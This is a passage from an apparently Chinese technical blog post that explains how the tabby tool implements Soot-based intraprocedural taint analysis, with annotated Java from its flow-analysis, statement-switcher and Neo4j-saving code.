是怎么实现的？</p><p>Passthrough属于程序内分析，是用到soot来实现的</p><blockquote><p>注意：<br>tabby 虽然支持forward analysis 和backward analysis，但是这里的forward 和backword 是在neo4j中实现的。在Soot Flow Analysis中，实际使用的是forward analysis。</p></blockquote><h4 id="3-2-1-FlowSet设计"><a href="#3-2-1-FlowSet设计" class="headerlink" title="3.2.1 FlowSet设计"></a>3.2.1 FlowSet设计</h4><p>FlowSet 为Map&lt;Local, TabbyVariable&gt;</p><h5 id="TabbyVariable"><a href="#TabbyVariable" class="headerlink" title="TabbyVariable"></a>TabbyVariable</h5><h4 id="3-2-2-FlowAnalysis的实现：PollutedVarsPointsToAnalysis"><a href="#3-2-2-FlowAnalysis的实现：PollutedVarsPointsToAnalysis" class="headerlink" title="3.2.2 FlowAnalysis的实现：PollutedVarsPointsToAnalysis"></a>3.2.2 FlowAnalysis的实现：PollutedVarsPointsToAnalysis</h4><p>PollutedVarsPointsToAnalysis extends ForwardFlowAnalysis&lt;Unit, Map&lt;Local, TabbyVariable&gt;&gt;</p><ul><li>ForwardFlowAnalysis，正向分析</li><li>Unit</li><li>FlowSet 为Map&lt;Local, TabbyVariable&gt;</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Context context; <span class="comment">// 同一函数内共享的上下文内容</span></span><br><span class="line"><span class="keyword">private</span> DataContainer dataContainer;</span><br><span class="line"><span class="keyword">private</span> Map&lt;Local, TabbyVariable&gt; emptyMap;</span><br><span class="line"><span class="keyword">private</span> Map&lt;Local, TabbyVariable&gt; initialMap;</span><br><span class="line"><span class="keyword">private</span> StmtSwitcher stmtSwitcher;</span><br><span class="line"><span class="keyword">private</span> MethodReference methodRef; <span class="comment">// method 引用，由tabby 定义的method</span></span><br><span class="line"><span class="keyword">private</span> Body body;<span class="comment">// soot JimpleBody，method.retrieveActiveBody() 而来</span></span><br></pre></td></tr></table></figure><h5 id="newInitialFlow"><a href="#newInitialFlow" class="headerlink" title="newInitialFlow"></a>newInitialFlow</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Map&lt;Local, TabbyVariable&gt; <span class="title">newInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> HashMap&lt;&gt;(emptyMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(Map&lt;Local, TabbyVariable&gt; source, Map&lt;Local, TabbyVariable&gt; dest)</span> </span>&#123;</span><br><span class="line">    dest.clear();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;Local, TabbyVariable&gt; entry : source.entrySet()) &#123;</span><br><span class="line">        Local value = entry.getKey();</span><br><span class="line">        TabbyVariable variable = entry.getValue();</span><br><span class="line">        dest.put(value, variable.deepClone(<span class="keyword">new</span> ArrayList&lt;&gt;()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h5><p>may analysis，merge应该用并集</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Map&lt;Local, TabbyVariable&gt; in1, Map&lt;Local, TabbyVariable&gt; in2, Map&lt;Local, TabbyVariable&gt; out)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// if else while 分支汇聚的时候 对结果集进行处理 取并集</span></span><br><span class="line">    copy(in1, out);</span><br><span class="line"></span><br><span class="line">    in2.forEach((local, in2Var) -&gt; &#123;<span class="comment">// 取并集</span></span><br><span class="line">        TabbyVariable outVar = out.get(local);</span><br><span class="line">        <span class="keyword">if</span>(outVar != <span class="keyword">null</span>)&#123;</span><br><span class="line">            outVar.union(in2Var);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            out.put(local, in2Var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="flowThrough"><a href="#flowThrough" class="headerlink" title="flowThrough"></a>flowThrough</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(Map&lt;Local, TabbyVariable&gt; in, Unit d, Map&lt;Local, TabbyVariable&gt; out)</span> </span>&#123;</span><br><span class="line">    Map&lt;Local, TabbyVariable&gt; newIn = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    copy(in, newIn);</span><br><span class="line">    context.setLocalMap(newIn);</span><br><span class="line">    context.setInitialMap(initialMap);</span><br><span class="line">    stmtSwitcher.setContext(context);</span><br><span class="line">    stmtSwitcher.setDataContainer(dataContainer);</span><br><span class="line">    d.apply(stmtSwitcher);</span><br><span class="line">    out.putAll(clean(context.getLocalMap()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里引入了stmtSwitcher</p><h5 id="doAnalysis"><a href="#doAnalysis" class="headerlink" title="doAnalysis"></a>doAnalysis</h5><p>引用cokeBeer 师傅的总结：</p><blockquote><p>这里我们来看作者实现的doAnalysis方法，它使用了getUseAndDefBoxes方法，获取jimple语言表示下的所有局部变量定义和调用情况，然后基于基础数据类型、局部变量、实例成员和数组四种数据类型的判断，分别处理以后保存到InitialMap中。这样InitialMap中就保存了方法调用过程中所有可能用到的局部变量。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAnalysis</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="comment">// getUseAndDefBoxes 获取jimple语言表示下的所有局部变量定义和调用情况</span></span><br><span class="line">       <span class="keyword">for</span>(ValueBox box:body.getUseAndDefBoxes())&#123;</span><br><span class="line">           Value value = box.getValue();</span><br><span class="line">           Type type = value.getType();</span><br><span class="line">           <span class="keyword">if</span>(type <span class="keyword">instanceof</span> PrimType)&#123; <span class="comment">// 对于基础数据类型 直接跳过</span></span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(value <span class="keyword">instanceof</span> Local &amp;&amp; !initialMap.containsKey(value))&#123;</span><br><span class="line">               initialMap.put((Local) value, TabbyVariable.makeLocalInstance((Local) value));</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(value <span class="keyword">instanceof</span> InstanceFieldRef)&#123;</span><br><span class="line">               InstanceFieldRef ifr = (InstanceFieldRef) value;</span><br><span class="line">               SootField sootField = ifr.getField();</span><br><span class="line">               SootFieldRef sfr = ifr.getFieldRef();</span><br><span class="line"></span><br><span class="line">               String signature = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">if</span>(sootField != <span class="keyword">null</span>)&#123;</span><br><span class="line">                   signature = sootField.getSignature();</span><br><span class="line">               &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sfr != <span class="keyword">null</span>)&#123;</span><br><span class="line">                   signature = sfr.getSignature();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               Value base = ifr.getBase();</span><br><span class="line">               <span class="keyword">if</span>(base <span class="keyword">instanceof</span> Local)&#123;</span><br><span class="line">                   TabbyVariable baseVar = initialMap.get(base);</span><br><span class="line">                   <span class="keyword">if</span>(baseVar == <span class="keyword">null</span>)&#123;</span><br><span class="line">                       baseVar = TabbyVariable.makeLocalInstance((Local) base);</span><br><span class="line">                       initialMap.put((Local) base, baseVar);</span><br><span class="line">                   &#125;</span><br><span class="line">                   TabbyVariable fieldVar = baseVar.getField(signature);</span><br><span class="line">                   <span class="keyword">if</span>(fieldVar == <span class="keyword">null</span>)&#123;</span><br><span class="line">                       <span class="keyword">if</span>(sootField != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           fieldVar = TabbyVariable.makeFieldInstance(baseVar, sootField);</span><br><span class="line">                       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sfr != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           fieldVar = TabbyVariable.makeFieldInstance(baseVar, sfr);</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">if</span>(fieldVar != <span class="keyword">null</span> &amp;&amp; signature != <span class="keyword">null</span>)&#123;</span><br><span class="line">                           fieldVar.setOrigin(value);</span><br><span class="line">                           baseVar.addField(signature, fieldVar);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(value <span class="keyword">instanceof</span> ArrayRef)&#123;</span><br><span class="line">               ArrayRef v = (ArrayRef) value;</span><br><span class="line">               Value base = v.getBase();</span><br><span class="line">               <span class="keyword">if</span>(base <span class="keyword">instanceof</span> Local)&#123;</span><br><span class="line">                   TabbyVariable baseVar = initialMap.get(base);</span><br><span class="line">                   <span class="keyword">if</span>(baseVar == <span class="keyword">null</span>)&#123;</span><br><span class="line">                       baseVar = TabbyVariable.makeLocalInstance((Local) base);</span><br><span class="line">                       initialMap.put((Local) base, baseVar);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">super</span>.doAnalysis();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-3-SimpleStmtSwitcher"><a href="#3-2-3-SimpleStmtSwitcher" class="headerlink" title="3.2.3 SimpleStmtSwitcher"></a>3.2.3 SimpleStmtSwitcher</h4><p>继承关系 SimpleStmtSwitcher -&gt; StmtSwitcher  -&gt; AbstractStmtSwitch -&gt; StmtSwitch</p><p><strong>StmtSwitch</strong></p><blockquote><p>Soot 在将Java翻译成Jimple过程中，提供了AbstractStmtSwitch 和soot.jimple.AbstractJimpleValueSwitch两个重要接口。AbstractStmtSwitch 是一个抽象访问类，它为Java(Soot)不同类型的stmts提供操作方法methods。AbstractJimpleValueSwitch 也是一个抽象访问者，它可以为操作virtualInvoke, specialInvoke, add表达式。</p></blockquote><p>简单来讲，就是可以通过StmtSwitch，“hook” 住每一个Stmt的分析过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractStmtSwitch</span> <span class="keyword">implements</span> <span class="title">StmtSwitch</span> </span>&#123;</span><br><span class="line">  Object result;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseBreakpointStmt</span><span class="params">(BreakpointStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseInvokeStmt</span><span class="params">(InvokeStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseAssignStmt</span><span class="params">(AssignStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseIdentityStmt</span><span class="params">(IdentityStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseEnterMonitorStmt</span><span class="params">(EnterMonitorStmt stmt)</span> </span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseExitMonitorStmt</span><span class="params">(ExitMonitorStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseGotoStmt</span><span class="params">(GotoStmt stmt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseIfStmt</span><span class="params">(IfStmt stmt)</span></span></span><br></pre></td></tr></table></figure><p>StmtSwitch的应用：通过Switchable#apply</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Unit</span> <span class="keyword">extends</span> <span class="title">Switchable</span>, <span class="title">Host</span>, <span class="title">Serializable</span>, <span class="title">Context</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Switchable</span> </span>&#123;</span><br><span class="line">  <span class="comment">/** Called when this object is visited. */</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">(Switch sw)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SimpleStmtSwitcher 实现了以下的接口：</p><h5 id="caseAssignStmt"><a href="#caseAssignStmt" class="headerlink" title="caseAssignStmt"></a>caseAssignStmt</h5><p>AssignStmt是一个正常的复制语句，比如说可以给一个堆栈变量$stack5赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stack5 = newarray (java.lang.Object)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>对应的操作逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseAssignStmt</span><span class="params">(AssignStmt stmt)</span> </span>&#123;</span><br><span class="line">    Value lop = stmt.getLeftOp();</span><br><span class="line">    Value rop = stmt.getRightOp();</span><br><span class="line">    TabbyVariable rvar = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> unbind = <span class="keyword">false</span>;</span><br><span class="line">    rightValueSwitcher.setUnit(stmt);</span><br><span class="line">    rightValueSwitcher.setContext(context);</span><br><span class="line">    rightValueSwitcher.setDataContainer(dataContainer);</span><br><span class="line">    rightValueSwitcher.setResult(<span class="keyword">null</span>);</span><br><span class="line">    rop.apply(rightValueSwitcher);</span><br><span class="line">    Object result = rightValueSwitcher.getResult();</span><br><span class="line">    <span class="keyword">if</span>(result <span class="keyword">instanceof</span> TabbyVariable)&#123;</span><br><span class="line">        rvar = (TabbyVariable) result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rop <span class="keyword">instanceof</span> Constant &amp;&amp; !(rop <span class="keyword">instanceof</span> StringConstant))&#123;</span><br><span class="line">        unbind = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rvar != <span class="keyword">null</span> &amp;&amp; rvar.getValue() != <span class="keyword">null</span> &amp;&amp; rvar.getValue().getType() <span class="keyword">instanceof</span> PrimType)&#123;</span><br><span class="line">        rvar = <span class="keyword">null</span>; <span class="comment">// 剔除基础元素的污点传递，对于我们来说，这部分是无用的分析</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理左值</span></span><br><span class="line">    <span class="keyword">if</span>(rvar != <span class="keyword">null</span> || unbind)&#123;</span><br><span class="line">        leftValueSwitcher.setContext(context);</span><br><span class="line">        leftValueSwitcher.setMethodRef(methodRef);</span><br><span class="line">        leftValueSwitcher.setRvar(rvar);</span><br><span class="line">        leftValueSwitcher.setUnbind(unbind);</span><br><span class="line">        lop.apply(leftValueSwitcher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进 lop.apply(leftValueSwitcher)，以caseLocal为例，针对Local变量赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseLocal</span><span class="params">(Local v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(v.getType() <span class="keyword">instanceof</span> PrimType) <span class="keyword">return</span>; <span class="comment">// 提出无用的类属性传递</span></span><br><span class="line"></span><br><span class="line">    TabbyVariable <span class="keyword">var</span> = context.getOrAdd(v);</span><br><span class="line"></span><br><span class="line">    generateAction(<span class="keyword">var</span>, rvar, -<span class="number">1</span>, unbind);</span><br><span class="line">    <span class="keyword">if</span>(unbind)&#123;</span><br><span class="line">        <span class="keyword">var</span>.clearVariableStatus();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">var</span>.assign(rvar, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generateAction(var, rvar, -1, unbind)，其中-1 表示this，最终调用</p><p>MethodReference#addAction </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAction</span><span class="params">(String key, String value)</span></span>&#123;</span><br><span class="line">    actions.put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>action 即是前文一节中的action结构。</p><h5 id="caseIdentityStmt"><a href="#caseIdentityStmt" class="headerlink" title="caseIdentityStmt"></a>caseIdentityStmt</h5><p>IdentityStmt通常指的是对变量赋值<br><code>r1 := 0: java.lang.String</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseIdentityStmt</span><span class="params">(IdentityStmt stmt)</span> </span>&#123;</span><br><span class="line">    Value lop = stmt.getLeftOp();</span><br><span class="line">    Value rop = stmt.getRightOp();</span><br><span class="line">    <span class="keyword">if</span>(rop <span class="keyword">instanceof</span> ThisRef)&#123;</span><br><span class="line">        context.bindThis(lop);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(rop <span class="keyword">instanceof</span> ParameterRef)&#123;</span><br><span class="line">        ParameterRef pr = (ParameterRef)rop;</span><br><span class="line">        context.bindArg((Local)lop, pr.getIndex());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="caseReturnStmt"><a href="#caseReturnStmt" class="headerlink" title="caseReturnStmt"></a>caseReturnStmt</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseReturnStmt</span><span class="params">(ReturnStmt stmt)</span> </span>&#123;</span><br><span class="line">    Value value = stmt.getOp();</span><br><span class="line">    TabbyVariable <span class="keyword">var</span> = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 近似处理 只要有一种return的情况是可控的，就认为函数返回是可控的</span></span><br><span class="line">    <span class="comment">// 并结算当前的入参区别</span></span><br><span class="line">    <span class="keyword">if</span>(context.getReturnVar() != <span class="keyword">null</span> &amp;&amp; context.getReturnVar().containsPollutedVar(<span class="keyword">new</span> ArrayList&lt;&gt;())) <span class="keyword">return</span>;</span><br><span class="line">    rightValueSwitcher.setUnit(stmt);</span><br><span class="line">    rightValueSwitcher.setContext(context);</span><br><span class="line">    rightValueSwitcher.setDataContainer(dataContainer);</span><br><span class="line">    rightValueSwitcher.setResult(<span class="keyword">null</span>);</span><br><span class="line">    value.apply(rightValueSwitcher);</span><br><span class="line">    <span class="keyword">var</span> = (TabbyVariable) rightValueSwitcher.getResult();</span><br><span class="line">    context.setReturnVar(<span class="keyword">var</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">var</span> != <span class="keyword">null</span> &amp;&amp; <span class="keyword">var</span>.isPolluted(-<span class="number">1</span>) &amp;&amp; reset)&#123;</span><br><span class="line">        methodRef.addAction(<span class="string">&quot;return&quot;</span>, <span class="keyword">var</span>.getValue().getRelatedType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="caseInvokeStmt"><a href="#caseInvokeStmt" class="headerlink" title="caseInvokeStmt"></a>caseInvokeStmt</h5><p>caseInvokeStmt 处理方法调用语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseInvokeStmt</span><span class="params">(InvokeStmt stmt)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// extract baseVar and args</span></span><br><span class="line">    InvokeExpr ie = stmt.getInvokeExpr();</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;&lt;java.lang.Object: void &lt;init&gt;()&gt;&quot;</span>.equals(ie.getMethodRef().getSignature())) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(GlobalConfiguration.DEBUG)&#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Analysis: &quot;</span>+ie.getMethodRef().getSignature() + <span class="string">&quot;; &quot;</span>+context.getTopMethodSignature());</span><br><span class="line">    &#125;</span><br><span class="line">    Switcher.doInvokeExprAnalysis(stmt, ie, dataContainer, context);</span><br><span class="line">    <span class="keyword">if</span>(GlobalConfiguration.DEBUG) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Analysis: &quot;</span> + ie.getMethodRef().getName() + <span class="string">&quot; done, return to&quot;</span> + context.getMethodSignature() + <span class="string">&quot;; &quot;</span>+context.getTopMethodSignature());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Switcher.doInvokeExprAnalysis 具体详细实现了函数调用的污点跟踪。</p><blockquote><p>疑问<br>GI是通过逆拓扑排序，确保处理方法调用的时候，其传播函数是已知的，这里Switcher.doInvokeExprAnalysis是如何处理的呢？</p></blockquote><h4 id="3-2-4-污点跟踪"><a href="#3-2-4-污点跟踪" class="headerlink" title="3.2.4 污点跟踪"></a>3.2.4 污点跟踪</h4><p>整个调用过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Analyser#runSootAnalysis</span><br><span class="line">  CallGraphScanner#run</span><br><span class="line">  CallGraphScanner#collect</span><br><span class="line">    CallGraphCollector#collect</span><br><span class="line">      Switcher#doMethodAnalysis</span><br><span class="line">        PollutedVarsPointsToAnalysis#makeDefault</span><br><span class="line">          SimpleStmtSwitcher#caseInvokeStmt</span><br><span class="line">            Switcher.doInvokeExprAnalysis</span><br><span class="line">              Switcher#buildCallRelationship</span><br><span class="line">              Call#setPollutedPosition &#x2F;&#x2F; 设置Call的PollutedPosition</span><br><span class="line">              Switcher#doMethodAnalysis</span><br><span class="line">          SimpleStmtSwitcher#caseIdentityStmt</span><br><span class="line">          SimpleStmtSwitcher#caseAssignStmt</span><br><span class="line">            lop.apply(leftValueSwitcher)</span><br><span class="line">              SimpleLeftValueSwitcher#caseLocal</span><br><span class="line">              SimpleLeftValueSwitcher#caseArrayRef</span><br><span class="line">                methodRef#addAction &#x2F;&#x2F; 设置Method 的action</span><br><span class="line">          SimpleStmtSwitcher#caseReturnStmt</span><br><span class="line">            methodRef#addAction &#x2F;&#x2F; 设置Method 的action</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Analyser#runSootAnalysis</span><br><span class="line">  ClassInfoScanner#run</span><br><span class="line">  ClassInfoScanner#loadAndExtract</span><br><span class="line">    ClassInfoCollector#collect</span><br><span class="line">    ClassInfoCollector#collect0</span><br><span class="line">    ClassInfoCollector#extractMethodInfo</span><br><span class="line">      methodRef#setPollutedPosition &#x2F;&#x2F;注意此处只是load 已知Sink&#x2F;knowledge</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到以上的路径中，完成了对Method.action 和Call.pollutedPosition 的赋值</p><blockquote><p>** 疑问 **<br>Method.pollutedPosition 属于v1使用的传播，是已经废弃了吗？<br>答案是YES，在后面的tabby-path-finder中，用到了两处pollutedPosition，一处是在初始化sink method的时候，用到了获取其method.pollutedPosition，在往后的传播过程中，都用的是Call边的pollutedPosition。</p></blockquote><h3 id="3-3-结果保存"><a href="#3-3-结果保存" class="headerlink" title="3.3 结果保存"></a>3.3 结果保存</h3><p>采用SpringBoot架构，通过定义Registry与对应Service，可以方便的进行数据库的存储。</p><p><img src="/images/pasted-342.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">App#run</span><br><span class="line">  Analyser#run</span><br><span class="line">  Analyser#save</span><br><span class="line">    DataCenter#save2Neo4j</span><br><span class="line">    